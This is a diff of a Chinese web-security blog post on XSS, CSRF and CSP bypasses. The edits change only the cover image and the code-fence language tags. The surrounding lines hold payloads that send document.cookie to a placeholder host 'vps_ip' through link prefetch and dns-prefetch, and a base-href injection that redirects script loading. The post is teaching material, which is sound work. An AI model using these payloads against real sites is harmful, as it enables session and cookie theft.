@@ -4,7 +4,7 @@ description: "XSS 与 CSRF 漏洞总结，梳理攻击场景、风险影响和�
 pubDate: "2026-03-26"
 updatedDate: "2026-03-26"
 tags: ["XSS", "CSRF", "Web安全"]
-cover: auto
+cover: "1782888575163..jpeg"
 coverAlt: "XSS & CSRF 的文章封面"
 draft: false
 ---
@@ -32,7 +32,7 @@ draft: false
 
 一段存在 DOM 型 XSS 的 JS 代码：
 
-```
+```javascript
 var search = document.getElementById('search').value;
 var results = document.getElementById('results');
 results.innerHTML = 'You searched for: ' + search;
@@ -189,17 +189,17 @@ CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来�
 
 作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。
 
-```
+```text
 Content-Security-Policy: policy
 ```
 
-策略由一系列策略指令所组成，每个策略指令都描述了针对某个特定资源的类型以及策略生效的范围。你的策略应当包含一个 default-src 策略指令，在其他资源类型没有符合自己的策略时应用该策略（有关完整列表，请查看 default-src 指令的描述）。一个策略可以包含 default-src 或者 script-src 指令来防止内联脚本运行，并杜绝 eval() 的使用。一个策略也可包含一个 default-src 或 style-src 指令去限制来自一个 <style> 元素或者 style 属性的內联样式。对于不同类型的项目都有特定的指令，因此每种类型都可以有自己的指令，包括字体、frame、图像、音频和视频媒体、script 和 worker。
+策略由一系列策略指令所组成，每个策略指令都描述了针对某个特定资源的类型以及策略生效的范围。你的策略应当包含一个 default-src 策略指令，在其他资源类型没有符合自己的策略时应用该策略（有关完整列表，请查看 default-src 指令的描述）。一个策略可以包含 default-src 或者 script-src 指令来防止内联脚本运行，并杜绝 eval() 的使用。一个策略也可包含一个 default-src 或 style-src 指令去限制来自一个 `<style>` 元素或者 style 属性的內联样式。对于不同类型的项目都有特定的指令，因此每种类型都可以有自己的指令，包括字体、frame、图像、音频和视频媒体、script 和 worker。
 
 ### 怎么绕过CSP
 
 #### link
 
-```
+```html
 <!-- firefox -->
 <link rel="dns-prefetch" href="//${cookie}.vps_ip">
 
@@ -211,7 +211,7 @@ Content-Security-Policy: policy
 
 或者
 
-```
+```javascript
 var link = document.createElement("link");
 link.setAttribute("rel", "prefetch");
 link.setAttribute("href", "//vps_ip/?" + document.cookie);
@@ -224,14 +224,14 @@ document.head.appendChild(link);
 
 还有一种是iframe，当存在一个同源站点，有一个A页面，一个B页面，其中一个页面存在XSP一个没有，没有CSP的那个页面存在XSS漏洞，就可以使用iframe去包含A页面，操作A页面的Dom，举个例子
 
-```
+```html
 <! A页面 >
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
 
 <h1 id="flag">flag{0xffff}</h1>
 ```
 
-```
+```html
 <! B页面 >
 
 <! 下面模拟XSS >
@@ -272,7 +272,7 @@ setTimeout(()=>alert(iframe.contentWindow.document.getElementById('flag').innerH
 
 举个例子
 
-```
+```text
 Content-Security-Policy: script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline'
 ```
 
@@ -287,11 +287,11 @@ Content-Security-Policy: script-src www.google.com; img-src *; default-src 'none
 
 - 1. script-src只使用nonce
 - 2. 没有额外设置base-uri
-- 3. 页面引用存在相对路径的<script>标签
+- 3. 页面引用存在相对路径的 `<script>` 标签
 
 满足这几个条件即可利用
 
-```
+```html
 <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'nonce-test'">
 <base href="//vps_ip/">
 <script nonce='test' src="2.js"></script>
